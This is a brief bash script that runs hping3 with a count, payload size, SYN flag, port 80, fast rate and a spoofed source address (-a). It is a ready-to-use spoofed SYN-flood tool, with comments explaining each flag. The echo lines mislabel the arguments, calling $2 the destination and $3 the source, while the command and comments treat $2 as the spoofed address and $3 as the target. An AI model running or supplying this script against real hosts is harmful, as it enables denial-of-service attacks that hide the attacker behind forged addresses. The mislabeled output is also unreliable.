#!/bin/bash

count=$1
dest_ip=$2
source_ip=$3

echo "count=$count"
echo "dest_ip=$dest_ip"
echo "source_ip=$source_ip"


sudo hping3 -c $1 -d 120 -S -w 64 -p 80 --fast -a $2 $3


#c for count
# d for  data size
 #S for syn
#w for TCP window siz(default is 64)
#p for port number
#a for spoof host 

#$3 is destination
#$2 is ip you want for spoof

exit 0
